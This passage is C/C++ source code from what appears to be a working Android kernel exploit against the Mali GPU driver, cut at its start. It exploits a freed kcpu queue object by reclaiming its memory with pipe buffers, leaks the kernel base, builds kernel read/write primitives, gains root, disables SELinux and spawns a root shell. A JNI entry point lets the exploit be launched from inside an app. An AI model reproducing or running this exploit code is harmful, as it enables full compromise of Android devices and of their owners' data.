        /* Free the kcpu object so we can fill its memory with something else */
        struct kbase_ioctl_kcpu_queue_delete _delete = { .id = ta->kcpu_id };
        do_print("[+] Freeing kcpu_id = %d (0x%llx)",ta->kcpu_id,ta->kcpu_kaddr);
        kbasep_kcpu_queue_delete(fd,&_delete);
        do_print("[+] Allocating %d pipes with %lu slots \n", PIPE_CNT_MAX - PIPE_CNT_STAGE_1, psize /PAGE_SIZE);

        for(int k=PIPE_CNT_STAGE_1; k < PIPE_CNT_MAX; k++) {
                int ret = fcntl(pipe_rd_id(k),F_SETPIPE_SZ,psize);
                if(ret == -1)  {
                        perror("fcntl");
                        getchar();
                } else
                        assert(psize == ret);
                usleep(100);
        }

        /* bump the head counter of each pipe */
        for(int k=PIPE_CNT_STAGE_1; k < PIPE_CNT_MAX; k++) {
                char tmp[0x1000] = {};
                size_t wsize = 0x10 * (k + 1);
                assert(wsize < sizeof(tmp));
                memset(tmp,0xcc,wsize);
                ssize_t wb = pipe_structs_write(k, tmp, wsize);
                assert(wb == wsize);
        }

        size_t read_size = 0x28;
        pipe_struct_read_with_guard(fake_pipe_index  ,rwbuf,read_size);

        __u64 new_mtx_next = *(__u64 *)(rwbuf + 0x10);
        __u64 new_kctx = *(__u64 *)(rwbuf + 0x30);

        struct pipe_buffer *pb = (struct pipe_buffer *) calloc(sizeof(*pb),1);
        struct pipe_buffer *pb_backup = (struct pipe_buffer *) calloc(sizeof(*pb),1);
        /* struct pipe_buffer *pb = (struct pipe_buffer *)rwbuf; */

        memcpy(pb,rwbuf,sizeof(*pb));
        if((pb->page == 0) || (pb->len > PAGE_SIZE) || (pb->ops == 0)) {
                do_print("The kcpi object has been replaced with something other than a pipe_buffer \n ");
                exit(0);
        }

        do_print("[+] Successfully overlapped the kcpuqueue object with a pipe buffer \n");
        hexdump(rwbuf,0x28);

        /* let's save a copy */
        memcpy(pb_backup,rwbuf,sizeof(*pb));
        do_print("[+] pipe_buffer {.page = 0x%llx, .offset = 0x%x, .len = 0x%x, ops = 0x%llx}\n",
                 pb->page,pb->offset,pb->len,(__u64)pb->ops);

        __u32 pipe_index = (pb->len / 0x10) - 1;
        prw.wr = pipe_index;
        prw.krw_idx = fake_pipe_index + 1;
        prw.krd_idx = fake_pipe_index;

        prw.anon_pipe_buf_ops = (__u64)pb->ops;

        memcpy(&prw.pb , pb,sizeof(prw.pb));
#if 0
        // The first reported version used page address bruteforce.
        // No need to use this method anymore since we already have anon_pipe_buf_ops.
        for(__u64 page=0xFFFFFFFEFFE00000; page < 0xFFFFFFFFFFE00000; page+=0x40) {
                __u64 addr = kernel_read64((__u64)conf->page_to_virt_fn(page));
                addr = *(__u64 *)(prw.rwbuf);
                __u64 addr2 = *(__u64 *)(prw.rwbuf + 8);

                if((addr == conf->stext_long1) && (addr2 == conf->stext_long2)) {
                        prw.kernel_base = (__u64)conf->page_to_virt_fn(page);
                        prw.selinux_state = prw.kernel_base + conf->selinux_state;
                        prw.kthreadd_task =  kernel_read64(prw.kernel_base + conf->kthread_task);
                        break;
                }
        }
#else
        prw.kernel_base = prw.anon_pipe_buf_ops - conf->anon_pipe_buf_ops;
        prw.selinux_state = prw.kernel_base + conf->selinux_state;
        prw.kthreadd_task =  kernel_read64(prw.kernel_base + conf->kthread_task);

#endif

        if(prw.kernel_base == 0) {
                do_print("Failed to get the kernel base, the kernel will crash soon \n");
                sleep(5);
                exit(0);
        }
        do_print("[+] kernel base = 0x%llx, kthreadd_task = 0x%llx selinux_state = 0x%llx \n",
                 prw.kernel_base,prw.kthreadd_task,prw.selinux_state);

        get_current_task();
        get_root();
        disable_selinux();


        int cleanup_ok = 0;
        for(int i=0; i < (256 * FDS); i++) {
                __u64 area = kcpu.kcpu_kaddr + (i * 0x4000);
                __u64 kaddr = kernel_read64(area);
                /* if(kaddr == virt_to_page(ta->kcpu_kaddr)) { */
                if(kaddr == conf->virt_to_page_fn(ta->kcpu_kaddr)) {
                        __u32 fake_len = *(__u32 *)(prw.rwbuf + 0xC); // must be FAKE_PIPE_LEN
#if 0
                        __u32 refcount = (__u32)kread64(kaddr + 0x34); // page->_refcount
                        do_print("page refcount 0x%x \n",refcount);
#else
                        __u32 refcount = 20;
#endif
                        refcount++;
                        /* prevent the page from being released */
                        kernel_write(kaddr + 0x34,(__u8 *)&refcount,4);

                        kernel_write(area + 0x10 , (__u8 *)&prw.anon_pipe_buf_ops, 8);
                        kernel_write(area + 0x10 + 0x4000 , (__u8 *)&prw.anon_pipe_buf_ops, 8);

                        //do_print("Found the first pipe_buffer address 0x%llx (0x%x) \n",area,fake_len);
                        cleanup_ok = 1;
                        break;
                }
        }

        close(ta->streamfd);
        do_print("[+] Cleanup  ... %s \n",cleanup_ok ? "OK" : "FAIL");
        if(getuid() == 0) {
                system("/system/bin/sh");
        }


        return 0;
}


#ifdef USE_STANDALONE
int main()
{
        setbuf(stdout, NULL);
        setbuf(stderr, NULL);
        return mali_exploit();
}



#else
extern "C" JNIEXPORT jstring JNICALL
Java_com_example_myapplication_MainActivity_stringFromJNI(
        JNIEnv* env,
        jobject /* this */) {

        mali_exploit();
        return NULL;
}
#endif

```